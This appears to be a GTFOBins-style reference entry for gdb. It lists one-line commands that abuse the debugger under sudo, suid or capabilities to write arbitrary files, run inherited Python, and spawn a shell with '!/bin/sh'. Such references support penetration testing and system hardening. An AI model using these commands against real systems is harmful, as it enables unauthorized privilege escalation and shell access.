title: gdb
html:
gdb

File Write

Context: sudo, suid, unprivileged

gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit

Inherit

Context: sudo, suid, unprivileged

gdb -nx -ex 'python ...' -ex quit

Shell

Context: capabilities, sudo, suid, unprivileged

gdb -nx -ex '!/bin/sh' -ex quit
excerpt: gdb File Write Context: sudo, suid, unprivileged gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit Inherit Context: sudo, suid, unprivileged gdb -nx -ex 'python ..
